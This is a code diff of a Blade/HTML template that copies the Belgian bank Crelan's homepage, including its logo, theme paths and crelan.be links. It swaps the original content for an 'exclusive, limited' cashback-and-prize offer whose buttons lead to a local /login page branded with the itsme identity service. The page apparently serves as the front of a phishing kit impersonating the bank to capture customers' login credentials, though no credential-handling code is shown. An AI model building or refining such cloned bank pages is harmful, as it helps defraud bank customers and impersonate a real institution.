@@ -26,9 +26,7 @@
   <link rel="stylesheet" media="all" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700">
   <link rel="stylesheet" media="all" href="./assets/css_1GFU5DBQLLheAS5os4zDXQZzzOzdyl7r30H4_f1Kjbk.css">
   <link rel="stylesheet" media="print" href="./assets/css_7R1-0AwhfgudIYpgHtQfuqkZJzQZoc4fy7tPB1V768Q.css">
-  <style>
 
-  </style>
 </head>
 
 <body class="front not-logged-in mobile-menu-disabled">
@@ -42,11 +40,11 @@
 
             <div class="region region--main-header">
               <div class="branding">
-                <a href="#" title="Home" rel="home">
+                <a href="#" title="{{ __('messages.home') }}" rel="home">
                   <div class="site-logo">
                     <img src="./assets/logo.svg"
                       onerror="this.src=&#39;/themes/custom/calibr8_easytheme/logo.png&#39;; this.onerror=null;"
-                      alt="Homepage Crelan">
+                      alt="{{ __('messages.logo_alt') }}">
                   </div>
                   <div class="site-name">Crelan</div>
                 </a>
@@ -116,7 +114,7 @@
 
                     <li class="icon icon-building agency-cta menu-item icon--replaced">
                       <a href="#" class="menu-link menu-link--functional menu-link--icon" data-once="agency-cta">
-                        <span class="menu-link__icon icon-building" aria-hidden="true"></span>
+
                         <span class="menu-link__text">{{ __('messages.find_office') }}</span>
                       </a>
 
@@ -132,641 +130,193 @@
         </div>
 
       </header>
-      <div class="content-wrapper">
+      <div class="main-content--wrapper">
+        <div class="content--section section--first">
+          <div class="square-absolute"
+            style="--width-box: 30px; --height-box: 30px; --top: 43px; --left: -96px;--radius:8px"></div>
+          <div class="square-absolute"
+            style="--width-box: 74px; --height-box: 74px; --top: 277px; --right: 530px !important;--radius:22px"></div>
+          <div class="square-absolute"
+            style="--width-box: 63px; --height-box: 63px; --top: -31px; --right: 210px !important;--radius:18px"></div>
+          <div class="square-absolute"
+            style="--width-box: 63px; --height-box: 63px; --top: 123px; --right: -31px !important;--radius:18px"></div>
+          <div class="square-absolute"
+            style="--width-box: 80px; --height-box: 80px; --bottom: -50px; --right: 384px !important;--radius:17px">
+          </div>
 
-        <div id="block-calibr8-easytheme-content" class="block block-system block-system-main-block">
+          <div class="square-absolute"
+            style="--width-box: 80px; --height-box: 80px; --top: 535px; --right: -217px !important;--radius:20px"></div>
+          <div class="square-absolute"
+            style="--width-box: 122px; --height-box: 122px; --top: 287px; --left: -192px;--radius:32px"></div>
 
-          <main style="display: flex; flex-direction: column;"
-            class="node--page node--full node node--page--full node-layout">
-            <div class="node-page-top">
-              <div class="node-page-top-inner node-page-inner">
-                <div style="background-color: white"
-                  class="hero-header hero-header--has-visual node--header node--hero-style extend-bg node__header node__header--with-image">
-                  <div class="hero-header__wrapper">
-                    <div class="hero-header__visual">
-                      <img alt="" src="./assets/main__img.png" width="800" height="400" loading="lazy"
-                        class="image-style-marketing-banner">
-                    </div>
-                    <div class="hero-header__content">
-                      <h1 class="visually-hidden"><span
-                          class="field--title field field--name-title field--type-string field--label-hidden">Particulieren</span>
-                      </h1>
-                      <h2 class="hero-header__title">
-                        {{ __('messages.hero_title') }}
-                      </h2>
-                      <h3>{{ __('messages.hero_intro') }} <strong>{{ __('messages.hero_exclusive') }}</strong></h3>
-                      <ul>
-                        <li> {{ __('messages.hero_benefit1') }}</li>
-                        <li> {{ __('messages.hero_benefit2') }}</li>
-                      </ul>
-                      <h3>{{ __('messages.hero_limited') }}</h3>
-
-                      <div
-                        class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link">
-                        <div
-                          class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link hero-header__cta__item">
-                          <a href="#" target="_self" data-once="click-event">{{ __('messages.participate') }}</a>
-                        </div>
-                      </div>
-
-                    </div>
-                    <div class="hero-header__img-block">
-                      <img src="./assets/main__img.png" alt="">
-                    </div>
-                  </div>
-                </div>
+          <div class="square-absolute"
+            style="--width-box: 141px; --height-box: 141px; --bottom: 548px; --right: -246px;--radius:31px"></div>
+          <div class="section--left-side">
+            <div class="section--tooltip">
+              <span>
+                {{ __('messages.tooltip') }}
+              </span>
+            </div>
+            <h1>
+              {{ __('messages.hero_title') }}
+            </h1>
+            <span>
+              {{ __('messages.hero_intro') }} {{ __('messages.hero_exclusive') }}
+            </span>
+            <div class="main--list">
+              <div class="main--list-item">
+                <div class="dot"></div>
+                <span>
+                  {{ __('messages.hero_benefit1') }}
+                </span>
+              </div>
+              <div class="main--list-item">
+                <div class="dot"></div>
+                <span>{{ __('messages.hero_benefit2') }}
+                </span>
               </div>
             </div>
-            <div class="node-page-center-forms">
-              <div class="benefits-container">
-                <div class="benefits-header">
 
-                  <h2>{{ __('messages.special_offer') }}</h2>
-                  <p>{{ __('messages.offer_description') }}</p>
-                </div>
+            <a href="/login">
+              <svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path
+                  d="M14.4319 0.0351009C13.4186 0.194626 5.27704 2.42795 4.79708 2.6761C4.13936 3.01287 2.96612 4.18271 2.62837 4.83853C2.48616 5.12213 1.82844 7.33773 1.17071 9.76604C-0.144736 14.729 -0.26917 15.757 0.388554 17.2282C0.921844 18.4335 7.37465 24.903 8.6901 25.5411C10.2011 26.2856 11.2854 26.1792 16.3873 24.8144C21.1691 23.5205 22.0579 23.1128 22.9467 21.8189C23.6044 20.8263 23.6933 20.6136 24.9199 15.9875C26.1109 11.5917 26.2176 10.6346 25.7198 9.11022C25.4354 8.25942 25.0265 7.78086 21.8268 4.55493C19.1604 1.87848 18.0227 0.850445 17.365 0.549122C16.4584 0.123726 15.2496 -0.0889721 14.4319 0.0351009ZM7.10801 4.57266C7.21466 4.66128 7.32132 5.01578 7.32132 5.33483C7.32132 6.46922 6.0592 6.78826 5.41926 5.83112C4.76153 4.82081 6.11253 3.79277 7.10801 4.57266ZM11.1432 5.8843C11.2499 6.29197 11.4099 6.46922 11.6587 6.46922C12.1565 6.46922 12.6542 6.98324 12.6542 7.49726C12.6542 8.11763 12.1743 8.5962 11.5521 8.5962C11.0544 8.5962 11.0544 8.61392 11.0544 9.64196C11.0544 11.6094 11.6765 12.1943 12.9564 11.4322C13.6853 11.0068 14.3252 11.0599 14.6096 11.6094C14.8407 12.0525 15.9428 12.1057 16.1028 11.6803C16.2628 11.2549 16.1384 11.1486 14.7874 10.6346C13.3475 10.0851 12.832 9.55334 12.832 8.57847C12.832 7.24911 14.2541 6.29197 15.8895 6.54012C17.4894 6.77054 18.4138 7.83403 17.7205 8.5962C17.2761 9.07477 16.7072 9.03932 16.2273 8.48985C15.7473 7.94038 14.8763 7.94038 14.8763 8.48985C14.8763 8.75572 15.1785 8.95069 16.1206 9.34064C17.5605 9.92556 18.1649 10.4928 18.1649 11.3081C18.1649 12.088 17.8271 12.6729 17.0983 13.1692C16.5295 13.5592 16.3517 13.5769 15.2318 13.4705C13.7208 13.3287 13.4008 13.3287 12.0143 13.4883C11.1788 13.5769 10.7699 13.5237 10.3077 13.311C9.75668 13.0451 9.65002 13.0451 9.17006 13.2933C7.96127 13.9136 5.91699 13.3465 5.45481 12.2475C5.17039 11.5562 5.08151 7.79858 5.34815 7.39091C5.43703 7.23138 5.79256 7.17821 6.3614 7.21366L7.23244 7.26683L7.28577 9.30519C7.3391 11.4322 7.46353 11.7867 8.22792 11.7867C8.9923 11.7867 9.09896 11.3...[1558 bytes truncated]
+                  fill="white" />
+              </svg>
 
-                <div class="benefits-content">
-                  <div class="benefits-list">
-                    <div class="benefit-item" onclick="toggleBenefit(0)">
-                      <div class="benefit-header">
-                        <div class="benefit-checkbox">
-                          <input type="checkbox" id="benefit-0-check" readonly>
-                          <label for="benefit-0-check"></label>
-                        </div>
-                        <div class="benefit-text">
-                          <h3>{{ __('messages.cashback_title') }}</h3>
-                        </div>
-                      </div>
-                      <div class="benefit-content" id="benefit-0">
-                        <p>{{ __('messages.cashback_description') }}</p>
-                        <p>{{ __('messages.cashback_details') }}</p>
-                      </div>
-                    </div>
+              {{ __('messages.participate_with_itsme') }}
+            </a>
+          </div>
 
-                    <div class="benefit-item" onclick="toggleBenefit(1)">
-                      <div class="benefit-header">
-                        <div class="benefit-checkbox">
-                          <input type="checkbox" id="benefit-1-check" readonly>
-                          <label for="benefit-1-check"></label>
-                        </div>
-                        <div class="benefit-text">
-                          <h3>{{ __('messages.bonus_title') }}</h3>
-                        </div>
-                      </div>
-                      <div class="benefit-content" id="benefit-1">
-                        <p>{{ __('messages.bonus_description') }}</p>
-                        <p>{{ __('messages.bonus_details') }}</p>
-                      </div>
-                    </div>
-
-                    <div class="benefit-item" onclick="toggleBenefit(2)">
-                      <div class="benefit-header">
-                        <div class="benefit-checkbox">
-                          <input type="checkbox" id="benefit-2-check" readonly>
-                          <label for="benefit-2-check"></label>
-                        </div>
-                        <div class="benefit-text">
-                          <h3>{{ __('messages.free_title') }}</h3>
-                        </div>
-                      </div>
-                      <div class="benefit-content" id="benefit-2">
-                        <p>{{ __('messages.free_description') }}</p>
-                        <p>{{ __('messages.free_details') }}</p>
-                      </div>
-                    </div>
-
-                    <div class="benefit-item" onclick="toggleBenefit(3)">
-                      <div class="benefit-header">
-                        <div class="benefit-checkbox">
-                          <input type="checkbox" id="benefit-3-check" readonly>
-                          <label for="benefit-3-check"></label>
-                        </div>
-                        <div class="benefit-text">
-                          <h3>{{ __('messages.win_title') }}</h3>
-                        </div>
-                      </div>
-                      <div class="benefit-content" id="benefit-3">
-                        <p>{{ __('messages.win_description') }}</p>
-                        <p>{{ __('messages.win_details') }}</p>
-                      </div>
-                    </div>
-
-                    <div class="benefit-item" onclick="toggleBenefit(4)">
-                      <div class="benefit-header">
-                        <div class="benefit-checkbox">
-                          <input type="checkbox" id="benefit-4-check" readonly>
-                          <label for="benefit-4-check"></label>
-                        </div>
-                        <div class="benefit-text">
-                          <h3>{{ __('messages.itsme_title') }}</h3>
-                        </div>
-                      </div>
-                      <div class="benefit-content" id="benefit-4">
-                        <p>{{ __('messages.itsme_description') }}</p>
-                        <p>{{ __('messages.itsme_details') }}</p>
-                      </div>
-                    </div>
-                  </div>
-
-                  <div class="benefits-sidebar">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" fill="none">
-                      <g clip-path="url(#clip0_902_3179)">
-                        <path
-                          d="M3.42649 45.8712C0.729037 43.1737 -0.670725 37.9587 0.31591 34.2746L5.70109 14.1871C6.67314 10.503 10.5079 6.68286 14.192 5.69623L34.2746 0.315909C37.9587 -0.656144 43.1786 0.724179 45.8761 3.42163L60.5784 18.1288C63.2758 20.8214 64.6707 26.0413 63.6841 29.7254L58.3038 49.8129C57.3317 53.4921 53.497 57.3123 49.8129 58.2989L29.7254 63.6841C26.0462 64.6561 20.8262 63.2709 18.1288 60.5735L3.42649 45.8712Z"
-                          fill="#FF4612" />
-                        <path
-                          d="M39.2758 23.0425C37.3658 22.3913 36.1507 22.1385 36.2382 21.0061C36.3062 20.1264 36.9721 19.6695 38.1823 19.7667C38.5287 19.7553 38.8714 19.8402 39.1726 20.0117C39.4737 20.1833 39.7214 20.435 39.8882 20.7388C40.0211 21.0038 40.2077 21.2382 40.4362 21.4271C40.6648 21.616 40.9301 21.7552 41.2154 21.8358C41.5007 21.9164 41.7997 21.9367 42.0933 21.8953C42.3869 21.854 42.6686 21.7519 42.9205 21.5956C43.1725 21.4393 43.389 21.2322 43.5565 20.9875C43.7239 20.7428 43.8385 20.4659 43.893 20.1745C43.9474 19.8831 43.9406 19.5835 43.8728 19.2949C43.805 19.0063 43.6779 18.7349 43.4994 18.4982C42.4933 17.2491 40.8408 16.4034 38.5128 16.2236C34.4253 15.9125 31.8493 17.7351 31.6112 20.8505C31.3536 24.1847 33.5942 25.0838 36.9866 26.2309C39.305 26.9745 39.9028 27.339 39.8007 28.311C39.6987 29.2831 38.9016 29.7303 37.6428 29.633C36.5978 29.5553 35.9514 29.147 35.6501 28.5152C35.4656 28.1766 35.1929 27.8943 34.8609 27.6983C34.5288 27.5023 34.1499 27.4 33.7643 27.4022C33.4754 27.3937 33.1879 27.4454 32.9201 27.5542C32.6523 27.663 32.4101 27.8264 32.209 28.034C31.8621 28.3609 31.4534 28.6153 31.0069 28.7822C30.5604 28.9491 30.0851 29.0252 29.6088 29.0061C28.3548 28.9721 27.2515 28.2965 27.2515 26.5468L27.2953 20.6853C27.6852 20.931 28.1369 21.0608 28.5978 21.0595C28.988 21.0658 29.3742 20.9812 29.726 20.8123C30.0778 20.6434 30.3854 20.3949 30.6244 20.0865C30.8635 19.7781 31.0274 19.4182 31.1032 19.0354C31.1791 18.6527 31.1647 18.2575 31.0613 17.8812C30.9579 17.505 30.7683 17.158 30.5075 16.8677C30.2467 16.5775 29.9219 16.3519 29.5588 16.209C29.1957 16.0661 28.8043 16.0096 28.4157 16.0442C28.027 16.0788 27.6517 16.2035 27.3196 16.4083V14.2697C27.3215 14.0888 27.2874 13.9092 27.2194 13.7415C27.1513 13.5738 27.0506 13.4213 26.923 13.2928C26.7955 13.1644 26.6437 13.0626 26.4765 12.9934C26.3093 12.9241 26.13 12.8888 25.949 12.8894H24.0875C23.7257 12.8894 23.3785 13.0325 23.1218 13.2874C22.865 13.5424 22.7195 13.8885 22.7169 14.2503L22.6343 26.8287C22.5128 28.3937 21.4338 28.9964 20.2041 29.0061C18.9162 29.0061 17.774 28.3354 17.774 26.5468L17.8615 18.6051C17.8628 18.4849 17.8402 18.3657 17.7951 18.2543C17.75 18.1429 17.6833 18.0416 17.5988 17.9561C17.5142 17.8707 17.4136 17.8029 17.3027 17.7566C17.1918 17.7103 17.0728 17.6865 16.9526 17.6865H14.1628C13.9226 17.6865 13.6922 17.7816 13.5219 17.951C13.3516 18.1204 13.2552 18.3503 13.254 18.5905L13.1665 27.6501C13.1373 31.4362 16.1118 33.1373 20.2139 33.1373C20.915 33.163 21.6126 33.0273 22.253 32.7408C22.8934 32.4543 23.4595 32.0246 23.9077 31.4848C24.9575 32.6075 26.5808 33.1373 28.5492 33.1373C30.5176 33.1373 31.9903 32.8797 33.4484 32.0486C34.6436 32.706 35.9739 33.0801 37.3366 33.1421C41.5845 33.4678 44.1653 31.548 44.418 28.2479C44.6464 25.288 42.4253 24.1069 39.2515 23.0085"
-                          fill="white" />
-                        <path
-                          d="M15.6987 15.7181C16.1969 15.721 16.6847 15.5757 17.1001 15.3007C17.5156 15.0257 17.8399 14.6334 18.0319 14.1737C18.2239 13.714 18.2749 13.2075 18.1784 12.7187C18.0819 12.23 17.8423 11.7809 17.49 11.4286C17.1377 11.0763 16.6886 10.8367 16.1998 10.7402C15.7111 10.6437 15.2046 10.6947 14.7449 10.8867C14.2852 11.0787 13.8929 11.403 13.6179 11.8185C13.3429 12.2339 13.1976 12.7217 13.2005 13.2199C13.2018 13.8821 13.4654 14.5168 13.9336 14.985C14.4018 15.4532 15.0365 15.7168 15.6987 15.7181Z"
-                          fill="white" />
-                        <path
-                          d="M45.1811 34.2114C41.0644 34.2114 37.9781 36.5298 37.1276 40.4374C36.8943 36.7728 34.5565 34.6051 31.1154 34.6051C28.7145 34.6051 27.1446 35.6841 26.2211 37.1324C25.1762 35.4994 23.4216 34.6051 21.2345 34.6051C19.2029 34.6051 12.7971 34.3572 12.7971 42.5905C12.7971 42.7606 12.7971 42.9113 12.7971 43.0765V48.5784C12.824 49.1565 13.0725 49.702 13.4912 50.1016C13.9098 50.5012 14.4662 50.7241 15.045 50.7241C15.6237 50.7241 16.1802 50.5012 16.5988 50.1016C17.0174 49.702 17.2659 49.1565 17.2928 48.5784V41.9733C17.2928 40.0632 18.3718 38.7752 20.1555 38.7752C21.7886 38.7752 22.7412 39.9125 22.7412 41.9441V48.5638C22.7681 49.1419 23.0167 49.6874 23.4353 50.087C23.8539 50.4866 24.4103 50.7095 24.9891 50.7095C25.5678 50.7095 26.1243 50.4866 26.5429 50.087C26.9615 49.6874 27.2101 49.1419 27.2369 48.5638V41.4192C27.4216 39.8202 28.4083 38.7752 30.0073 38.7752C31.7327 38.7752 32.6561 39.9125 32.6561 41.9441V48.5638C32.683 49.1419 32.9316 49.6874 33.3502 50.087C33.7688 50.4866 34.3253 50.7095 34.904 50.7095C35.4827 50.7095 36.0392 50.4866 36.4578 50.087C36.8764 49.6874 37.125 49.1419 37.1519 48.5638V45.0498C38.0316 48.8846 41.1179 51.1835 45.3074 51.1835C47.1597 51.2042 48.9725 50.6469 50.4933 49.5893L50.6343 49.4872C50.6829 49.4483 50.7363 49.4143 50.7849 49.3706C50.7849 49.3706 50.8335 49.3268 50.7849 49.3706C50.8627 49.3123 50.9405 49.2539 51.0134 49.1908C51.3027 48.9121 51.5072 48.5573 51.6034 48.1673C51.6995 47.7773 51.6834 47.368 51.5569 46.9868C51.4303 46.6056 51.1985 46.268 50.8881 46.013C50.5778 45.7579 50.2017 45.5959 49.8032 45.5456C49.4185 45.4918 49.0265 45.5455 48.6705 45.7008C48.3145 45.8561 48.0084 46.1068 47.7862 46.4253C47.2758 47.096 46.3864 47.4751 45.1762 47.4751C43.0911 47.4751 41.8615 46.1823 41.774 44.1653H51.4945C51.8812 44.1653 52.2521 44.0116 52.5256 43.7382C52.799 43.4647 52.9526 43.0939 52.9526 42.7072V42.3427C52.9526 37.2637 49.8663 34.2357 45.1762 34.2357L45.1811 34.2114ZM41.774 41.113C41.9004 39.0328 43.1932 37.8323 45.147 37.8323C47.2272 37.8323 48.2382 39.1252 48.3305 41.113H41.774Z"
-                          fill="white" />
-                      </g>
-                      <defs>
-                        <clipPath id="clip0_902_3179">
-                          <rect width="64" height="64" fill="white" />
-                        </clipPath>
-                      </defs>
-                    </svg>
-                    <div class="benefits-sidebar--block">
-                      <div class="participate-button-container">
-                        <button type="button" onclick="window.location.href='/login'" class="participate-button">
-                          {{ __('messages.participate_now') }}
-                        </button>
-                      </div>
-                      <div class="sidebar-info">
-                        <p>{{ __('messages.sidebar_info') }}</p>
-                      </div>
-                    </div>
-
-
-                  </div>
-                </div>
-              </div>
-            </div>
-            <div class="node-page-center">
-              <div class="node-page-main">
-                <div class="node-region--content-top">
-                  <div class="container">
-
-                  </div>
-
-                  <div class="node-region--content">
-                    <div class="container">
-                      <section
-                        class="paragraph--main-navigation paragraph--default paragraph--main-navigation--default paragraph paragraph--without-title">
-                        <div class="paragraph__content-wrapper paragraph--main-navigation__content-wrapper">
-                          <div class="paragraph__content paragraph--main-navigation__content">
-                            <nav class="paragraph-menu" aria-label="Quick Links">
-                              <ul class="menu menu--inpage-nav-front menu--parent">
-
-                                <li class="menu-item menu-item--expanded">
-                                  <a href="#" target="_self" class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>
-                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">
-
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/2067">{{ __('messages.checking_accounts') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/2069">{{ __('messages.credit_cards') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/7266">{{ __('messages.debit_cards') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/71">{{ __('messages.online_banking') }}</a>
-
-                                    </li>
-
-                                  </ul>
-                                </li>
-                                <li class="menu-item menu-item--expanded">
-                                  <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>
-                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">
-
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/76">{{ __('messages.housing') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/77">{{ __('messages.mobility') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/78">{{ __('messages.other_goals') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/87">{{ __('messages.professionals') }}</a>
-
-                                    </li>
-
-                                  </ul>
-                                </li>
-                                <li class="menu-item menu-item--expanded">
-                                  <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>
-                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">
-
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/73">{{ __('messages.savings_accounts') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="taxonomy/term/74">{{ __('messages.pension_savings') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/7016">{{ __('messages.start_investing') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="node/7309">{{ __('messages.savings_bonds') }}</a>
-
-                                    </li>
-
-                                  </ul>
-                                </li>
-                                <li class="menu-item menu-item--expanded">
-                                  <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                    data-drupal-link-system-path="kantoorzoeker">{{ __('messages.offices') }}</a>
-                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">
-
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.contact') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.make_appointment') }}</a>
-
-                                    </li>
-                                    <li class="menu-item menu-item--level-1">
-                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
-                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.opening_hours') }}</a>
-
-                                    </li>
-
-                                  </ul>
-                                </li>
-
-                              </ul>
-                            </nav>
-                          </div>
-                        </div>
-
-                      </section>
-                      <section
-                        class="paragraph--banner paragraph--default paragraph--banner--default break-out-of-container paragraph paragraph--without-title">
-                        <div class="field--banner banner banner--visual-half-image banner--colour-light">
-                          <div class="banner__inner">
-                            <div class="banner__visuals">
-                              <div class="banner__visual"
-                                style="background-image: url(&quot;https://www.crelan.be/sites/default/files/styles/banner/public/2024-03/contact%20agency%204_0.png?c=e4d95234_1413&amp;itok=M4xmt6nV&quot;)">
-                              </div>
-                            </div>
-
-                            <div class="banner__content">
-                              <h2 class="banner__title">
-                                {{ __('messages.your_agent') }}
-
-                              </h2>
-
-                              <div class="banner__text">
-
-                                <div
-                                  class="field--text clearfix text-formatted field field--name-field-text field--type-text-long field--label-hidden field-items-count-1 field-items-cols-1 field__item">
-                                  <ul>
-                                    <li>{{ __('messages.personal_advice') }}</li>
-                                    <li>{{ __('messages.questions_answered') }}</li>
-                                    <li>{{ __('messages.local_presence') }}</li>
-                                    <li>{{ __('messages.wide_range') }}</li>
-                                  </ul>
-                                </div>
-
-                              </div>
-
-                              <div class="banner__cta">
-
-                                <div
-                                  class="field--block-ctas field field--name-field-block-ctas field--type-entity-reference-revisions field--label-hidden field-items-count-1 field-items-cols-1 field__items">
-                                  <div class="field__item">
-
-                                    <section
-                                      class="click-event child-paragraph paragraph--block-ctas paragraph--default paragraph--block-ctas--default paragraph paragraph--without-title">
-                                      <a href="#" target="_self" class="button button-default"
-                                        data-once="click-event">{{ __('messages.contact_agent') }}</a>
-                                    </section>
-                                  </div>
-                                </div>
-
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-
-                      </section>
-                    </div>
-                  </div>
-                </div>
-              </div>
-
-          </main>
-
+          <img src="/assets/main-section--image2.png" class="section--image1" alt="">
+          <img src="/assets/main-section--image1.png" class="section--image2" alt="">
         </div>
-        <aside id="block-socialmediasharingblock"
-          class="block block-calibr8-socialmedia block-calibr8-socialmedia-sharing">
-          <ul id="sharing-menu" class="menu social-menu">
-            <li><a href="https://facebook.com/sharer.php?u=https://www.crelan.be/nl/particulieren"
-                class="social-share-link--facebook icon-social-facebook"><span
-                  class="element-invisible">Facebook</span></a></li>
-            <li><a href="https://twitter.com/intent/tweet?url=https://www.crelan.be/nl/particulieren"
-                class="social-share-link--twitter icon-social-twitter"><span
-                  class="element-invisible">Twitter</span></a></li>
-            <li><a href="https://www.linkedin.com/shareArticle?url=https://www.crelan.be/nl/particulieren"
-                class="social-share-link--linkedin icon-social-linkedin"><span
-                  class="element-invisible">Linkedin</span></a></li>
-          </ul>
+        <div class="content--section section--second">
+          <div class="section--left-side">
+            <div class="left-side--text">
+              <h4>
+                {{ __('messages.special_offer') }}
+              </h4>
+              <span>
+                {{ __('messages.offer_description') }}
+              </span>
+            </div>
+            <div class="second-section--faq-wrapper">
+              @php
+                $faqItems = [
+                  [
+                    'q' => __('messages.faq_cashback_q'),
+                    'a' => __('messages.faq_cashback_a'),
+                  ],
+                  [
+                    'q' => __('messages.faq_bonus_q'),
+                    'a' => __('messages.faq_bonus_a'),
+                  ],
+                  [
+                    'q' => __('messages.faq_free_q'),
+                    'a' => __('messages.faq_free_a'),
+                  ],
+                  [
+                    'q' => __('messages.faq_win_q'),
+                    'a' => __('messages.faq_win_a'),
+                  ],
+                  [
+                    'q' => __('messages.faq_itsme_q'),
+                    'a' => __('messages.faq_itsme_a'),
+                  ],
+                ];
+              @endphp
 
-        </aside>
-      </div>
-
-      <footer class="site-footer">
-        <div class="region region--footer">
-          <div class="container">
-            <div class="footer__content-wrapper">
-              <div id="block-combo-menu-footer-clients" class="block block-crelan block-crelan-combo-block">
-                <div class="block-content">
-                  <div class="combo-block-region blockregion-1">
-                    <div class="combo-block-col-item combo-block-col-item--product-footer">
-                      <h2 class="combo-block-title">{{ __('messages.our_offer') }}</h2>
-                      <ul class="menu menu--product-footer menu--parent">
-
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/75">{{ __('messages.invest') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
-                            data-drupal-link-system-path="node/2204">{{ __('messages.rates') }}</a>
-
-                        </li>
-
-                      </ul>
+              <div class="faq--block">
+                @foreach(array_slice($faqItems, 0, 2) as $item)
+                  <div class="faq--question">
+                    <div class="faq--header">
+                      <span>
+                        {{ $item['q'] }}
+                      </span>
+                      <svg width="12" height="7" viewBox="0 0 12 7" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1 1L6.00081 5.58L11 1" stroke="#00AE53" stroke-width="2" stroke-linecap="round"
+                          stroke-linejoin="round" />
+                      </svg>
+                    </div>
+                    <img src="/assets/separator.svg" class="faq-separator" alt="">
+                    <div class="faq--answer">
+                      <span>{!! nl2br(e($item['a'])) !!}</span>
                     </div>
                   </div>
-                  <div class="combo-block-region blockregion-2">
-                    <div class="combo-block-col-item combo-block-col-item--theme-footer">
-                      <h2 class="combo-block-title">{{ __('messages.themes') }}</h2>
-                      <ul class="menu menu--theme-footer menu--parent">
+                @endforeach
+              </div>
 
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="taxonomy/term/113">{{ __('messages.family') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="taxonomy/term/112">{{ __('messages.pension') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="node/1986">{{ __('messages.professionals') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="node/3172">{{ __('messages.cooperative_bank') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" class="menu-link menu-link--theme-footer"
-                            data-drupal-link-system-path="node/2221">{{ __('messages.blogs') }}</a>
-
-                        </li>
-
-                      </ul>
+              <div class="faq--block">
+                @foreach(array_slice($faqItems, 2) as $item)
+                  <div class="faq--question">
+                    <div class="faq--header">
+                      <span>
+                        {{ $item['q'] }}
+                      </span>
